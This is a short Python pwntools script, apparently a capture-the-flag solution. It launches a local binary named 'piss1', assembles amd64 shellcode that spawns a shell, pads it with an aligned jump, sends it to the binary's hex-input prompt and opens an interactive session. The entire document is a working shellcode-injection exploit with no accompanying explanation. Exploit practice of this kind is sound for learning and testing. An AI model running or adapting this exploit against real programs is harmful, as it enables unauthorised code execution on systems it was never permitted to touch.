from pwn import *

p = process("./piss1")
p.recvuntil("Type some hex (end with newline):")

context.arch = "amd64"

code = """
jmp L1

.align 0x200
L1:
%s
""" % (shellcraft.amd64.linux.sh(),)

print(code)

assembled = asm(code)
print(assembled.hex())
p.sendline(assembled.hex())

p.interactive()
